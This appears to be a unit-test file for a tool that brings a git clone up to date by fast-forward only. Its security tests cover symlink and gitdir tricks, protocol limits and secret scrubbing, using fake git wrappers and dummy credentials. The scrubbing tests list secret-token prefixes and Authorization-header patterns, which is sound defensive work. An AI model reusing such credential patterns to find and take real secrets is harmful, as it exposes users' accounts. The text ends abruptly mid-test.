# SPDX-License-Identifier: Apache-2.0
"""lib/refresh.py: bringing a world clone up to date by fast-forward only.

Real git in temporary folders: a bare repository is the world, one clone is what the kit updates, and a second clone
pushes as another person. Nothing reaches the network (the servers here listen on this machine only), and nothing reads
your own git configuration: every call gets a home and a global configuration of its own.

The security tests have positive controls. Each one that says "does not run" also runs plain git in the same
situation and shows that it DOES run, so a test cannot pass only because the thing it looks for never happens here.
"""
import base64
import collections
import functools
import glob
import http.server
import io
import os
import random
import re
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from unittest import mock

import helpers
import gitcred
import refresh

REFRESH = os.path.join(helpers.ROOT, "lib", "refresh.py")
REAL_GIT = shutil.which("git")
WATCHDOG = 120  # seconds: no run of refresh.py in these tests takes a tenth of this
CODES = {
    "current": {"ok"}, "updated": {"ok"},
    "skipped": {"off", "unverified", "not-git", "detached", "no-upstream", "ahead", "diverged", "untrusted"},
    "failed": {"fetch", "timeout", "merge", "error"},
}
Answer = collections.namedtuple("Answer", "status code text line")
# What the first version of the update accepted as the scope of a clone's credential helper: any https host, or this machine over plain http.
OLD_HELPER_SCOPE = re.compile(r"https://[^/\s]+|http://(?:127\.0\.0\.1|localhost)(?::[0-9]+)?")
SPAWN_ADDRESS = "https://git.spawn.co/@alice/game-1.git"  # what Spawn lists as the world's git address in the tests that need an https one
DEFAULT_ADDRESS = object()  # "the address the fixture recorded": a test passes None to give none, or any text

# A stand-in for git that hangs on a fetch and records the ids of what it leaves running (a shell, and a child of the shell).
HANGING_FETCH = '''for a in "$@"; do
  if [ "$a" = fetch ]; then
    echo $$ > "$PIDS"
    sleep 300 &
    echo $! >> "$PIDS"
    wait
    exit 0
  fi
done
exec "$REAL_GIT" "$@"
'''
# A stand-in for git that records every call (its arguments) and the environment it was given, then runs the real git.
RECORDING = '''{ printf "CALL"; for a in "$@"; do printf "\\t%s" "$a"; done; printf "\\n"; } >> "$CALLS"
{ echo "---"; env; } >> "$ENV_LOG"
exec "$REAL_GIT" "$@"
'''


def is_running(pid):
    """A process that exists and is not a zombie (a zombie is dead, it only waits to be collected)."""
    try:
        with open("/proc/%d/stat" % pid) as handle:
            return handle.read().rsplit(")", 1)[1].split()[0] != "Z"
    except (FileNotFoundError, ProcessLookupError):
        return False
    except OSError:  # no /proc on this system
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            return False
        return True


def wait_until_gone(pids, seconds=15.0):  # a stopped git is killed 3 seconds (TERM_GRACE) after it was asked: the rest is slack for a loaded machine
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        if not any(is_running(pid) for pid in pids):
            return True
        time.sleep(0.05)
    return False


def read_pids(path):
    with open(path) as handle:
        return [int(line) for line in handle.read().split()]


def processes_with(needle):
    """The /proc entries of processes whose command line holds this text."""
    found = []
    for entry in glob.glob("/proc/[0-9]*/cmdline"):
        try:
            with open(entry, "rb") as handle:
                if needle.encode() in handle.read():
                    found.append(entry)
        except OSError:
            pass
    return found


class AuthenticatedGitServer:
    """Serves a folder over plain http (git's "dumb" protocol) on this machine and insists on Basic authentication."""

    def __init__(self, directory):
        self.seen = []  # the Authorization header of every request (None when there was none)
        outer = self

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                outer.seen.append(self.headers.get("Authorization"))
                if not self.headers.get("Authorization"):
                    self.send_response(401)
                    self.send_header("WWW-Authenticate", 'Basic realm="world"')
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                super().do_GET()

            def log_message(self, *args):
                pass

        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), functools.partial(Handler, directory=directory))
        self.port = self.server.server_address[1]

    def __enter__(self):
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        return self

    def __exit__(self, *exc):
        self.server.shutdown()
        self.server.server_close()


class RefreshCase(unittest.TestCase):
    """A bare world, the clone the kit updates (self.clone) and a second clone that pushes as another person (self.other)."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        t = self.tmp.name
        self.global_config = os.path.join(t, "gitconfig")
        with open(self.global_config, "w"):
            pass
        os.makedirs(os.path.join(t, "home"))
        # The kit's runtime home, with one account's token file: a credential helper in a clone may read only the kit's own token files.
        self.spawn_home = os.path.join(t, "spawn-home")
        self.token_file = os.path.join(self.spawn_home, "accounts", "alice", "token")
        os.makedirs(os.path.dirname(self.token_file))
        with open(self.token_file, "w") as handle:
            handle.write("secret-test-password\n")
        # Nothing here may read your own git configuration, whatever your environment says.
        self.env = {
            "HOME": os.path.join(t, "home"), "XDG_CONFIG_HOME": os.path.join(t, "xdg"), "GIT_CONFIG_GLOBAL": self.global_config,
            "GIT_CONFIG_NOSYSTEM": "1", "GIT_ALLOW_PROTOCOL": "file", "GIT_TERMINAL_PROMPT": "0", "REAL_GIT": REAL_GIT,
            "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.invalid", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.invalid",
            "SDLCA_SPAWN_HOME": self.spawn_home, "SPAWN_TOKEN_FILE": self.token_file,  # as the handler has them
        }
        self.world = os.path.join(t, "world.git")
        self.clone = os.path.join(t, "clone")
        self.other = os.path.join(t, "other")
        self.marker = os.path.join(t, "something-ran")  # nothing in these tests may create it, except a control that shows it can
        seed = os.path.join(t, "seed")
        self.git("init", "-q", "--bare", "-b", "main", self.world, cwd=t)
        self.git("init", "-q", "-b", "main", seed, cwd=t)
        self.write(seed, "greeting.txt", "one\n")
        self.write(seed, "notes.txt", "notes\n")
        self.git("add", ".", cwd=seed)
        self.git("commit", "-q", "-m", "born", cwd=seed)
        self.git("push", "-q", self.world, "main", cwd=seed)
        self.git("clone", "-q", self.world, self.clone, cwd=t)
        self.git("clone", "-q", self.world, self.other, cwd=t)
        # The git address that sdlca-worlds recorded for the world, and the clone's remote spelled as it: the update trusts only that address.
        # A file URL, because the update takes no other form of address and the tests must not reach a network.
        self.address = "file://" + self.world
        self.git("remote", "set-url", "origin", self.address, cwd=self.clone)

    # helpers

    def kit_made_clone(self, name="made-by-the-kit"):
        """A clone made the way sdlca-worlds makes one (the credential helper scoped to Spawn's git host, the extra notes rule) of Spawn's https
        address, which the user's global configuration here sends to the local world, so nothing leaves this machine."""
        self.git("config", "--file", self.global_config, "url.%s.insteadOf" % ("file://" + self.world), SPAWN_ADDRESS)
        settings = []
        for setting in gitcred.clone_config(SPAWN_ADDRESS, "alice_helper", self.token_file):
            settings += ["--config", setting]
        made = os.path.join(self.tmp.name, name)
        self.git("clone", "-q", *settings, "--", SPAWN_ADDRESS, made, cwd=self.tmp.name)
        return made

    def use_https_address(self, clone=None):
        """Record an https address for the world (and put it in the clone's remote) without any network: the user's global configuration, which
        the tests own and the update does not check, sends that address to the local world. Returns the address."""
        self.git("config", "--file", self.global_config, "url.%s.insteadOf" % ("file://" + self.world), SPAWN_ADDRESS)
        self.git("remote", "set-url", "origin", SPAWN_ADDRESS, cwd=clone or self.clone)
        self.address = SPAWN_ADDRESS
        return SPAWN_ADDRESS

    def git(self, *args, cwd=None, check=True, extra_env=None, drop_env=()):
        env = dict(self.env, PATH=os.environ["PATH"])
        env.update(extra_env or {})
        for name in drop_env:
            env.pop(name, None)
        return subprocess.run([REAL_GIT, *args], cwd=cwd or self.clone, env=env, check=check, capture_output=True, text=True)

    def write(self, repo, name, content):
        path = os.path.join(repo, name)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as handle:
            handle.write(content)

    def read(self, repo, name):
        with open(os.path.join(repo, name)) as handle:
            return handle.read()

    def program(self, name="program.sh"):
        """A program that leaves self.marker behind when it runs."""
        path = os.path.join(self.tmp.name, name)
        with open(path, "w") as handle:
            handle.write('#!/bin/sh\necho ran >> "%s"\n' % self.marker)
        os.chmod(path, 0o755)
        return path

    def head(self, repo=None):
        return self.git("rev-parse", "HEAD", cwd=repo).stdout.strip()

    def push_from_other(self, name, content, message=None):
        """Another person commits and pushes to the world. Returns the new tip."""
        self.write(self.other, name, content)
        self.git("add", ".", cwd=self.other)
        self.git("commit", "-q", "-m", message or ("change " + name), cwd=self.other)
        self.git("push", "-q", "origin", "main", cwd=self.other)
        return self.head(self.other)

    def commit_here(self, name, content, repo=None):
        repo = repo or self.clone
        self.write(repo, name, content)
        self.git("add", ".", cwd=repo)
        self.git("commit", "-q", "-m", "local " + name, cwd=repo)
        return self.head(repo)

    def merges(self, repo=None):
        return self.git("rev-list", "--merges", "HEAD", cwd=repo).stdout.split()

    def tree_state(self, repo=None):
        """What a refusal must leave as it was: HEAD, the index, the status and every file outside .git."""
        repo = repo or self.clone
        files = {}
        for base, dirs, names in os.walk(repo):
            dirs[:] = [d for d in dirs if d != ".git"]
            for name in names:
                with open(os.path.join(base, name), "rb") as handle:
                    files[os.path.relpath(os.path.join(base, name), repo)] = handle.read()
        return (self.head(repo), self.git("status", "--porcelain=v1", "-z", cwd=repo).stdout,
                self.git("ls-files", "-s", cwd=repo).stdout, files)

    def raw_snapshot(self, repo=None):
        """Every byte under the clone, .git included. A refresh that stops before it fetches must leave all of it alone."""
        repo = repo or self.clone
        snapshot = {}
        for base, _, names in os.walk(repo):
            for name in names:
                path = os.path.join(base, name)
                with open(path, "rb") as handle:
                    snapshot[os.path.relpath(path, repo)] = handle.read()
        return snapshot

    def no_locks(self):
        self.assertEqual(glob.glob(os.path.join(self.clone, ".git", "**", "*.lock"), recursive=True), [])

    def fake_git(self, body):
        """The folder of a `git` that runs body (a /bin/sh script; $REAL_GIT is the real git). Put it first on PATH."""
        directory = os.path.join(self.tmp.name, "fakebin")
        os.makedirs(directory, exist_ok=True)
        path = os.path.join(directory, "git")
        with open(path, "w") as handle:
            handle.write("#!/bin/sh\n" + body)
        os.chmod(path, 0o755)
        return directory

    def path_with(self, directory):
        return directory + os.pathsep + os.environ["PATH"]

    def arguments(self, clone=None, address=DEFAULT_ADDRESS):
        """The arguments of lib/refresh.py: the clone and the recorded address. None as the address gives no second argument at all."""
        address = self.address if address is DEFAULT_ADDRESS else address
        return [clone or self.clone] + ([] if address is None else [address])

    def run_raw(self, clone=None, env=None, cwd=None, drop=(), input=None, address=DEFAULT_ADDRESS):
        """Run lib/refresh.py and give back what happened, unchecked."""
        full = dict(self.env, PATH=os.environ["PATH"])
        full.update(env or {})
        for name in drop:
            del full[name]
        return subprocess.run([sys.executable, "-I", "-B", REFRESH, *self.arguments(clone, address)], env=full, cwd=cwd, input=input,
                              capture_output=True, text=True, timeout=WATCHDOG)  # a hang is an error here, not a stalled test run

    def refresh(self, clone=None, env=None, cwd=None, drop=(), input=None, address=DEFAULT_ADDRESS):
        """Run lib/refresh.py the way the handler does, and check the contract of what it prints."""
        result = self.run_raw(clone, env, cwd, drop, input, address)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stderr, "")
        self.assertTrue(result.stdout.endswith("\n"), repr(result.stdout))
        self.assertEqual(result.stdout.count("\n"), 1, repr(result.stdout))  # exactly one line, and nothing else
        fields = result.stdout[:-1].split("\t")
        self.assertEqual(len(fields), 3, repr(result.stdout))
        status, code, text = fields
        self.assertIn(code, CODES.get(status, ()), result.stdout)
        self.assertTrue(text)
        self.assertLessEqual(len(text), 200)
        self.assertFalse([c for c in text if ord(c) < 32 or ord(c) == 127], repr(text))
        return Answer(status, code, text, result.stdout)

    def assertAnswer(self, answer, status, code):
        self.assertEqual((answer.status, answer.code), (status, code), answer.line)

    def recorded_run(self, drop=(), **env):
        """Run the refresh with a git that records what it is given. Returns the answer, the calls and the environments."""
        calls = os.path.join(self.tmp.name, "calls")
        env_log = os.path.join(self.tmp.name, "env-log")
        env.update(PATH=self.path_with(self.fake_git(RECORDING)), CALLS=calls, ENV_LOG=env_log)
        answer = self.refresh(env=env, drop=drop)
        with open(calls) as handle:
            made = [line.rstrip("\n").split("\t")[1:] for line in handle if line.startswith("CALL")]
        with open(env_log) as handle:
            blocks = [b.splitlines() for b in handle.read().split("---\n") if b]
        return answer, made, blocks


class OutcomeTests(RefreshCase):
    def test_a_clone_that_is_already_current_says_so_and_changes_nothing(self):
        before = self.tree_state()
        answer = self.refresh()
        self.assertAnswer(answer, "current", "ok")
        self.assertEqual(answer.text, "already at " + self.head()[:7])
        self.assertEqual(self.tree_state(), before)
        self.assertEqual(self.merges(), [])

    def test_a_clone_that_is_one_commit_behind_moves_forward_in_a_straight_line(self):
        old = self.head()
        new = self.push_from_other("greeting.txt", "two\n")
        answer = self.refresh()
        self.assertAnswer(answer, "updated", "ok")
        self.assertEqual(answer.text, "%s..%s, 1 new commit" % (old[:7], new[:7]))
        self.assertEqual(self.head(), new)
        self.assertEqual(self.read(self.clone, "greeting.txt"), "two\n")
        self.assertEqual(self.merges(), [])  # no merge commit
        self.assertEqual(self.git("rev-parse", "HEAD^").stdout.strip(), old)  # a single step from where it was
        self.assertEqual(self.git("status", "--porcelain=v1").stdout, "")
        self.assertEqual(self.git("rev-parse", "origin/main").stdout.strip(), new)  # the tracking branch moved too

    def test_a_clone_that_is_several_commits_behind_moves_forward_to_the_tip(self):
        old = self.head()
        self.push_from_other("greeting.txt", "two\n")
        self.push_from_other("extra/new.txt", "fresh\n")
        new = self.push_from_other("notes.txt", "more notes\n")
        answer = self.refresh()
        self.assertAnswer(answer, "updated", "ok")
        self.assertEqual(answer.text, "%s..%s, 3 new commits" % (old[:7], new[:7]))
        self.assertEqual(self.head(), new)
        self.assertEqual(self.read(self.clone, "greeting.txt"), "two\n")
        self.assertEqual(self.read(self.clone, "extra/new.txt"), "fresh\n")
        self.assertEqual(self.read(self.clone, "notes.txt"), "more notes\n")
        self.assertEqual(self.merges(), [])
        self.assertEqual(self.git("rev-list", "--count", old + "..HEAD").stdout.strip(), "3")

    def test_a_second_run_after_an_update_finds_nothing_to_do(self):
        self.push_from_other("greeting.txt", "two\n")
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertAnswer(self.refresh(), "current", "ok")

    def test_local_commits_that_are_not_pushed_change_nothing(self):
        mine = self.commit_here("local.txt", "mine\n")
        before = self.tree_state()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "ahead")
        self.assertEqual(answer.text, "1 local commit is not pushed")
        self.assertEqual(self.head(), mine)
        self.assertEqual(self.tree_state(), before)
        self.commit_here("local2.txt", "mine too\n")
        self.assertEqual(self.refresh().text, "2 local commits are not pushed")

    def test_a_clone_and_a_world_that_have_both_moved_on_change_nothing_and_say_how_far(self):
        self.commit_here("local1.txt", "a\n")
        mine = self.commit_here("local2.txt", "b\n")
        self.push_from_other("greeting.txt", "two\n")
        self.push_from_other("extra.txt", "x\n")
        self.push_from_other("notes.txt", "y\n")
        before = self.tree_state()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "diverged")
        self.assertEqual(answer.text, "the clone has 2 commits the world lacks, and the world has 3 commits the clone lacks")
        self.assertEqual(self.head(), mine)
        self.assertEqual(self.tree_state(), before)
        self.assertEqual(self.merges(), [])
        self.assertFalse(os.path.exists(os.path.join(self.clone, ".git", "MERGE_HEAD")))

    def test_a_world_that_rewrote_its_history_by_force_counts_as_diverged(self):
        self.push_from_other("greeting.txt", "two\n")
        self.assertAnswer(self.refresh(), "updated", "ok")  # the clone now holds the commit that the world is about to throw away
        thrown_away = self.head()
        self.git("reset", "-q", "--hard", "HEAD~1", cwd=self.other)
        self.write(self.other, "greeting.txt", "rewritten\n")
        self.git("commit", "-q", "-am", "rewritten", cwd=self.other)
        self.git("push", "-q", "--force", "origin", "main", cwd=self.other)
        before = self.tree_state()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "diverged")
        self.assertEqual(self.head(), thrown_away)
        self.assertEqual(self.tree_state(), before)
        self.assertEqual(self.read(self.clone, "greeting.txt"), "two\n")

    def test_a_world_that_moved_back_to_an_older_commit_is_not_reported_as_commits_that_are_not_pushed(self):
        older = self.head()
        removed = self.push_from_other("secret.txt", "a leaked secret\n")
        self.assertAnswer(self.refresh(), "updated", "ok")  # the clone now holds the commit that the world is about to remove
        self.git("push", "-q", "--force", "origin", older + ":refs/heads/main", cwd=self.other)  # a rollback, or history rewritten to remove the secret
        before = self.tree_state()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "diverged")  # not "ahead": pushing that commit would put the secret back
        self.assertIn("moved back", answer.text)
        self.assertEqual(self.tree_state(), before)
        self.assertEqual(self.head(), removed)
        # the advice that the prompt gives for this: a plain rebase brings the removed commit back, a rebase with --fork-point does not
        self.commit_here("work.txt", "new work\n")
        self.git("fetch", "-q", "origin")
        self.git("branch", "keep")
        self.git("rebase", "--fork-point", "origin/main")
        self.assertNotIn(removed, self.git("rev-list", "HEAD").stdout.split())
        self.assertEqual(self.read(self.clone, "work.txt"), "new work\n")
        self.git("reset", "-q", "--hard", "keep")
        self.git("rebase", "origin/main")
        self.assertIn(removed, self.git("rev-list", "HEAD").stdout.split(), "control: a plain rebase did not bring the removed commit back, so the advice proves nothing")

    def test_commits_that_are_not_pushed_stay_ahead_when_the_world_has_only_moved_forward(self):
        self.push_from_other("greeting.txt", "two\n")
        self.assertAnswer(self.refresh(), "updated", "ok")  # the tracking branch has a history of its own by now
        self.push_from_other("notes.txt", "more\n")
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.commit_here("local.txt", "mine\n")
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "ahead")  # the world only ever moved forward: the clone sits on a straight line of its history
        self.assertEqual(answer.text, "1 local commit is not pushed")

    def test_a_change_to_a_file_the_update_does_not_touch_is_kept(self):
        self.write(self.clone, "notes.txt", "my own notes\n")  # tracked, and the world does not change it
        self.write(self.clone, "scratch.txt", "untracked\n")
        new = self.push_from_other("greeting.txt", "two\n")
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.head(), new)
        self.assertEqual(self.read(self.clone, "greeting.txt"), "two\n")
        self.assertEqual(self.read(self.clone, "notes.txt"), "my own notes\n")
        self.assertEqual(self.read(self.clone, "scratch.txt"), "untracked\n")
        self.assertEqual(self.git("status", "--porcelain=v1").stdout, " M notes.txt\n?? scratch.txt\n")

    def test_a_staged_change_to_a_file_the_update_does_not_touch_is_kept(self):
        self.write(self.clone, "notes.txt", "staged notes\n")
        self.git("add", "notes.txt")
        self.push_from_other("greeting.txt", "two\n")
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.git("status", "--porcelain=v1").stdout, "M  notes.txt\n")

    def test_a_change_the_update_would_overwrite_is_never_lost_and_the_tree_stays_exactly_as_it_was(self):
        self.write(self.clone, "greeting.txt", "my edit\n")  # the world is about to change this very file
        self.push_from_other("greeting.txt", "two\n")
        before = self.tree_state()
        answer = self.refresh()
        self.assertAnswer(answer, "failed", "merge")
        self.assertTrue(answer.text.startswith("git said: "), answer.text)
        self.assertEqual(self.read(self.clone, "greeting.txt"), "my edit\n")
        self.assertEqual(self.tree_state(), before)
        self.assertEqual(self.git("stash", "list").stdout, "")  # nothing was stashed either
        self.assertEqual(self.merges(), [])
        self.no_locks()

    def test_a_staged_change_the_update_would_overwrite_stays_staged(self):
        self.write(self.clone, "greeting.txt", "staged edit\n")
        self.git("add", "greeting.txt")
        self.push_from_other("greeting.txt", "two\n")
        before = self.tree_state()
        self.assertAnswer(self.refresh(), "failed", "merge")
        self.assertEqual(self.tree_state(), before)

    def test_an_untracked_file_the_update_would_overwrite_is_never_lost(self):
        self.write(self.clone, "brand-new.txt", "mine\n")
        self.push_from_other("brand-new.txt", "theirs\n")
        before = self.tree_state()
        self.assertAnswer(self.refresh(), "failed", "merge")
        self.assertEqual(self.read(self.clone, "brand-new.txt"), "mine\n")
        self.assertEqual(self.tree_state(), before)

    def test_a_merge_that_the_person_has_not_finished_is_left_alone(self):
        self.git("checkout", "-q", "-b", "side")
        self.commit_here("side.txt", "side\n")
        self.git("checkout", "-q", "main")
        self.git("merge", "-q", "--no-commit", "--no-ff", "side")  # in the middle of a merge, with HEAD still on main
        merge_head = os.path.join(self.clone, ".git", "MERGE_HEAD")
        self.assertTrue(os.path.exists(merge_head))
        self.push_from_other("greeting.txt", "two\n")
        before = self.tree_state()
        self.assertAnswer(self.refresh(), "failed", "merge")
        self.assertTrue(os.path.exists(merge_head))
        self.assertEqual(self.tree_state(), before)

    def test_a_detached_head_is_skipped(self):
        self.git("checkout", "-q", "--detach")
        self.push_from_other("greeting.txt", "two\n")
        before = self.raw_snapshot()
        self.assertAnswer(self.refresh(), "skipped", "detached")
        self.assertEqual(self.raw_snapshot(), before)

    def test_a_branch_without_an_upstream_is_skipped(self):
        self.git("checkout", "-q", "-b", "feature")
        before = self.raw_snapshot()
        answer = self.refresh()
        self.assertAnswer(answer, "skipped", "no-upstream")
        self.assertIn("feature", answer.text)
        self.assertEqual(self.raw_snapshot(), before)

    def test_a_repository_with_no_commits_yet_is_skipped(self):
        empty = os.path.join(self.tmp.name, "empty")
        self.git("init", "-q", "-b", "main", empty, cwd=self.tmp.name)
        self.assertAnswer(self.refresh(clone=empty), "skipped", "no-upstream")

    def test_an_unborn_branch_that_follows_an_upstream_is_skipped_too(self):
        empty_world = os.path.join(self.tmp.name, "empty-world.git")
        self.git("init", "-q", "--bare", "-b", "main", empty_world, cwd=self.tmp.name)
        empty_clone = os.path.join(self.tmp.name, "empty-clone")
        self.git("clone", "-q", empty_world, empty_clone, cwd=self.tmp.name)
        self.git("config", "branch.main.remote", "origin", cwd=empty_clone)
        self.git("config", "branch.main.merge", "refs/heads/main", cwd=empty_clone)
        self.assertAnswer(self.refresh(clone=empty_clone), "skipped", "no-upstream")

    def test_a_folder_that_is_not_a_git_work_tree_is_skipped(self):
        plain = os.path.join(self.tmp.name, "plain")
        os.makedirs(plain)
        self.assertAnswer(self.refresh(clone=plain), "skipped", "not-git")
        self.assertAnswer(self.refresh(clone=os.path.join(self.tmp.name, "does-not-exist")), "skipped", "not-git")
        a_file = os.path.join(self.tmp.name, "a-file")
        with open(a_file, "w"):
            pass
        self.assertAnswer(self.refresh(clone=a_file), "skipped", "not-git")

    def test_a_folder_inside_a_repository_is_not_the_top_of_a_work_tree(self):
        inside = os.path.join(self.clone, "subfolder")
        os.makedirs(inside)
        before = self.raw_snapshot()
        self.assertAnswer(self.refresh(clone=inside), "skipped", "not-git")
        self.assertEqual(self.raw_snapshot(), before)  # the repository around it was not touched

    def test_a_bare_repository_is_not_a_work_tree(self):
        self.assertAnswer(self.refresh(clone=self.world), "skipped", "not-git")

    def test_a_clone_folder_that_is_a_symbolic_link_is_not_trusted(self):
        link = os.path.join(self.tmp.name, "link")
        os.symlink(self.clone, link)
        self.push_from_other("greeting.txt", "two\n")
        before = self.head()
        self.assertAnswer(self.refresh(clone=link), "skipped", "untrusted")
        self.assertAnswer(self.refresh(clone=link + "/"), "skipped", "untrusted")  # a trailing slash must not hide the link
        self.assertEqual(self.head(), before)

    def test_a_git_entry_that_is_a_symbolic_link_is_not_trusted(self):
        elsewhere = os.path.join(self.tmp.name, "elsewhere")
        shutil.copytree(self.clone, elsewhere, symlinks=True)
        shutil.rmtree(os.path.join(self.clone, ".git"))
        os.symlink(os.path.join(elsewhere, ".git"), os.path.join(self.clone, ".git"))
        self.assertAnswer(self.refresh(), "skipped", "untrusted")

    def test_a_git_entry_that_is_a_file_pointing_elsewhere_is_not_trusted(self):
        elsewhere = os.path.join(self.tmp.name, "elsewhere.git")
        shutil.move(os.path.join(self.clone, ".git"), elsewhere)
        with open(os.path.join(self.clone, ".git"), "w") as handle:
            handle.write("gitdir: %s\n" % elsewhere)
        self.assertEqual(self.git("rev-parse", "--show-toplevel").stdout.strip(), os.path.realpath(self.clone))  # git itself is happy with it
        self.assertAnswer(self.refresh(), "skipped", "untrusted")

    def test_a_work_tree_that_the_configuration_moves_elsewhere_is_not_the_clone(self):
        elsewhere = os.path.join(self.tmp.name, "elsewhere")
        os.makedirs(elsewhere)
        self.git("config", "--local", "core.worktree", elsewhere)
        self.assertAnswer(self.refresh(), "skipped", "not-git")

    def test_a_remote_that_cannot_be_reached_fails_quickly_and_names_the_problem(self):
        gone = "file://" + os.path.join(self.tmp.name, "gone.git")  # the world's recorded address, and the clone's remote, which nothing answers
        self.git("remote", "set-url", "origin", gone)
        before = self.tree_state()
        started = time.monotonic()
        answer = self.refresh(address=gone)
        self.assertLess(time.monotonic() - started, 20)
        self.assertAnswer(answer, "failed", "fetch")
        self.assertTrue(answer.text.startswith("git said: "), answer.text)
        self.assertLessEqual(len(answer.text), len("git said: ") + 120)
        self.assertEqual(self.tree_state(), before)

    def test_a_branch_that_the_world_no_longer_has_is_a_failed_fetch(self):
        self.git("config", "branch.main.merge", "refs/heads/renamed")
        before = self.tree_state()
        self.assertAnswer(self.refresh(), "failed", "fetch")
        self.assertEqual(self.tree_state(), before)

    def test_only_https_is_allowed_unless_the_caller_says_otherwise(self):
        self.push_from_other("greeting.txt", "two\n")
        before = self.tree_state()
        answer = self.refresh(drop=("GIT_ALLOW_PROTOCOL",))  # the clone's remote is a local path: not https
        self.assertAnswer(answer, "failed", "fetch")
        self.assertIn("not allowed", answer.text)
        self.assertEqual(self.tree_state(), before)

    def test_an_update_leaves_the_clones_own_settings_alone(self):
        self.git("config", "--local", "user.name", "Someone")
        self.git("config", "--local", "--add", "remote.origin.fetch", "+refs/notes/*:refs/notes/*")
        config = self.read(self.clone, ".git/config")
        self.push_from_other("greeting.txt", "two\n")
        self.assertAnswer(self.refresh(), "updated", "ok")
        self.assertEqual(self.read(self.clone, ".git/config"), config)


class OutputTests(RefreshCase):
    def failing_fetch(self, **env):
        body = 'for a in "$@"; do if [ "$a" = fetch ]; then printf "%b" "$SAID" >&2; exit 128; fi; done\nexec "$REAL_GIT" "$@"\n'
        env["PATH"] = self.path_with(self.fake_git(body))
        return self.refresh(env=env)

    def test_the_answer_is_one_line_of_three_fields_even_when_git_says_something_ugly(self):
        said = ("fatal: could not read 'https://" + "bob:hunter2" + "@git.example.invalid/x.git'\\tTAB\\033[31mred\\007bell\\000nul\\r"  # check-secrets:allow
                "second line\\nthird line")
        answer = self.failing_fetch(SAID=said)
        self.assertAnswer(answer, "failed", "fetch")
        self.assertEqual(answer.text, "git said: fatal: could not read 'https://git.example.invalid/x.git' TAB [31mred bell nul")  # the first line, cleaned
        self.assertNotIn("hunter2", answer.line)
        self.assertNotIn("second line", answer.line)

    def test_a_long_error_is_cut_short_and_says_so(self):
        answer = self.failing_fetch(SAID="fatal: " + "x" * 400 + "\\n")
        self.assertAnswer(answer, "failed", "fetch")
        self.assertEqual(len(answer.text), len("git said: ") + 120)
        self.assertTrue(answer.text.endswith("..."))

    def test_text_never_carries_a_token_a_password_or_a_header(self):
        token = "sak_" + "0123456789abcdef0123456789abcdef"
        answer = self.failing_fetch(SAID="fatal: bad password=hunter2 Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== " + token, )
        self.assertAnswer(answer, "failed", "fetch")
        for secret in (token, "hunter2", "QWxhZGRpbjpvcGVuIHNlc2FtZQ"):
            self.assertNotIn(secret, answer.line)

    def test_every_secret_shape_and_header_the_scrubber_knows_is_removed(self):
        body = "0123456789abcdef0123456789abcdef"
        # the prefixes of AGENTS.md rule 4 (a Spawn token, an invite code, two Slack tokens) and the other shapes the scanner knows
        for prefix in ("sak_", "sbk_", "xoxb-", "xoxp-", "xapp-", "ghp_", "gho_", "github_pat_", "glpat-"):
            with self.subTest(prefix=prefix):
                text = refresh.clean("fatal: bad token %s end" % (prefix + body), 200)
                self.assertNotIn(body, text)
                self.assertEqual(text, "fatal: bad token [removed] end")
        for header in ("Authorization: Basic", "Authorization:Basic", "authorization:  basic", "AUTHORIZATION: Bearer", "Authorization: Bearer", "Authorization:   Bearer"):
            with self.subTest(header=header):
                text = refresh.clean("sent %s QWxhZGRpbjpvcGVuIHNlc2FtZQ== twice" % header, 200)
                self.assertNotIn("QWxhZGRpbjpvcGVuIHNlc2FtZQ", text)
                self.assertTrue(text.endswith("[removed] twice"), text)
        text = refresh.clean("the password=hunter2 was wrong", 200)
        self.assertNotIn("hunter2", text)

    def test_a_git_that_fails_without_a_word_still_gives_a_sentence(self):
        answer = self.failing_fetch(SAID="")
        self.assertAnswer(answer, "failed", "fetch")
        self.assertEqual(answer.text, "git exited with status 128 and said nothing")

    def test_a_missing_git_is_failed_error_and_still_exit_status_zero(self):
        empty = os.path.join(self.tmp.name, "empty-path")
        os.makedirs(empty)
        self.assertAnswer(self.refresh(env={"PATH": empty}), "failed", "error")

    def test_an_answer_git_gives_that_is_not_what_was_asked_for_is_failed_error(self):
        body = 'for a in "$@"; do if [ "$a" = rev-list ]; then echo "not numbers"; exit 0; fi; done\nexec "$REAL_GIT" "$@"\n'
        self.push_from_other("greeting.txt", "two\n")
        answer = self.refresh(env={"PATH": self.path_with(self.fake_git(body))})
        self.assertAnswer(answer, "failed", "error")

    def test_a_timeout_of_zero_turns_it_off_and_runs_no_git_at_all(self):
        calls = os.path.join(self.tmp.name, "git-calls")
        body = 'echo called >> "$GIT_CALLS"\nexec "$REAL_GIT" "$@"\n'
        self.push_from_other("greeting.txt", "two\n")
        before = self.head()
        answer = self.refresh(env={"SDLCA_REFRESH_TIMEOUT": "0", "PATH": self.path_with(self.fake_git(body)), "GIT_CALLS": calls})
        self.assertAnswer(answer, "skipped", "off")
        self.assertFalse(os.path.exists(calls), "git was run")
        self.assertEqual(self.head(), before)
        # off is decided first: the clone does not even have to exist
        self.assertAnswer(self.refresh(clone=os.path.join(self.tmp.name, "nothing-here"), env={"SDLCA_REFRESH_TIMEOUT": "0"}), "skipped", "off")

    def test_a_bad_timeout_value_counts_as_sixty_and_the_update_still_runs(self):
